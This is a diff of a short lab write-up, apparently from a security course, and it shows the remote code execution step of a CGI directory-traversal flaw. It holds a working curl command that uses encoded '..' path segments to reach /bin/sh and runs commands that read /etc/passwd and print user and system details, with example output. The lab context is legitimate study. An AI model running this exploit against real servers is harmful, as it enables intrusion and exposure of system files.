@@ -30,12 +30,12 @@ This vulnerability is trivial to exploit and results in directory traversal, loc
 
 Remote code execution:
 ```sh
-curl --path-as-is "http://website1.cpsc4270.foul.dev/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo;ls -alh /etc/passwd;whoami;uname -a"
+curl --path-as-is "http://website1.cpsc4270.local:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo;ls -alh /etc/passwd;whoami;uname -a"
 ```
 
 Example output:
 ```
 -rw-r--r-- 1 root root 1.6K Oct 23 23:38 /etc/passwd
-daemon
+abronsius
 Linux dbsec-vm-main 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
 ```
